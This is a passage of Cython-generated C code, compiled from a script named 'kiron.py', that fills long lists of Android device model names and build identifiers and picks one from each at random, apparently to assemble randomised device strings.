  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 27, __pyx_kp_s_RD1A_201105_003_C1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29U);
  __Pyx_GIVEREF(__pyx_n_s_MMB29U);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 28, __pyx_n_s_MMB29U)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NDE63H);
  __Pyx_GIVEREF(__pyx_n_s_NDE63H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 29, __pyx_n_s_NDE63H)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_N4F26J);
  __Pyx_GIVEREF(__pyx_n_s_N4F26J);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 30, __pyx_n_s_N4F26J)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF27D);
  __Pyx_GIVEREF(__pyx_n_s_NMF27D);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 31, __pyx_n_s_NMF27D)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_N4F26X);
  __Pyx_GIVEREF(__pyx_n_s_N4F26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 32, __pyx_n_s_N4F26X)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 33, __pyx_n_s_KOT49H)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JWR66L);
  __Pyx_GIVEREF(__pyx_n_s_JWR66L);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 34, __pyx_n_s_JWR66L)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY48G);
  __Pyx_GIVEREF(__pyx_n_s_LMY48G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 35, __pyx_n_s_LMY48G)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY48J);
  __Pyx_GIVEREF(__pyx_n_s_LMY48J);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 36, __pyx_n_s_LMY48J)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MDB08M);
  __Pyx_GIVEREF(__pyx_n_s_MDB08M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 37, __pyx_n_s_MDB08M)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_HLK75H);
  __Pyx_GIVEREF(__pyx_n_s_HLK75H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 38, __pyx_n_s_HLK75H)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_HLK75F);
  __Pyx_GIVEREF(__pyx_n_s_HLK75F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 39, __pyx_n_s_HLK75F)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_HRI83);
  __Pyx_GIVEREF(__pyx_n_s_HRI83);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 40, __pyx_n_s_HRI83)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_HLK75C);
  __Pyx_GIVEREF(__pyx_n_s_HLK75C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 41, __pyx_n_s_HLK75C)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_EPE54B);
  __Pyx_GIVEREF(__pyx_n_s_EPE54B);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 42, __pyx_n_s_EPE54B)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G950FXXU3CRGH);
  __Pyx_GIVEREF(__pyx_n_s_G950FXXU3CRGH);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 43, __pyx_n_s_G950FXXU3CRGH)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G950FXXS6DTA1);
  __Pyx_GIVEREF(__pyx_n_s_G950FXXS6DTA1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 44, __pyx_n_s_G950FXXS6DTA1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_3};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 339, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_v_bbbb = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":340
 *      mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
 *      bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
 *      kkkkki = random.choice(['RMX2185','RMX2085','SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])             # <<<<<<<<<<<<<<
 *      mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 *      mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e','Realme','Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(300); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_RMX2185);
  __Pyx_GIVEREF(__pyx_n_s_RMX2185);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_RMX2185)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_RMX2085);
  __Pyx_GIVEREF(__pyx_n_s_RMX2085);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 1, __pyx_n_s_RMX2085)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_SM_G920F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 3, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T535);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T535);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 4, __pyx_kp_s_SM_T535)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 5, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T231);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_SM_T231)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 7, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 9, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 10, __pyx_kp_s_GT_I9190)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 11, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 12, __pyx_kp_s_GT_N7100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 13, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T561);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 14, __pyx_kp_s_SM_T561)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 15, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 16, __pyx_kp_s_GT_N7100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 17, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 18, __pyx_kp_s_GT_I9500)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22C);
  __Pyx_GIVEREF(__pyx_n_s_LRX22C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 19, __pyx_n_s_LRX22C)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 20, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 21, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 22, __pyx_kp_s_SM_G930F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 23, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 24, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 25, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 26, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF26X);
  __Pyx_GIVEREF(__pyx_n_s_NMF26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 27, __pyx_n_s_NMF26X)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 28, __pyx_kp_s_GT_P5100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_IML74K);
  __Pyx_GIVEREF(__pyx_n_s_IML74K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 29, __pyx_n_s_IML74K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 30, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 31, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 32, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 33, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T531);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 34, __pyx_kp_s_SM_T531)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 35, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SPH_L720);
  __Pyx_GIVEREF(__pyx_kp_s_SPH_L720);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 36, __pyx_kp_s_SPH_L720)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 37, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 38, __pyx_kp_s_GT_I9500)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JDQ39);
  __Pyx_GIVEREF(__pyx_n_s_JDQ39);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 39, __pyx_n_s_JDQ39)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G935F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G935F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 40, __pyx_kp_s_SM_G935F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 41, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T561);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 42, __pyx_kp_s_SM_T561)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 43, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T531);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 44, __pyx_kp_s_SM_T531)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 45, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 46, __pyx_kp_s_SM_J320FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 47, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 48, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 49, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500FU);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500FU);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 50, __pyx_kp_s_SM_A500FU)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 51, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 52, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
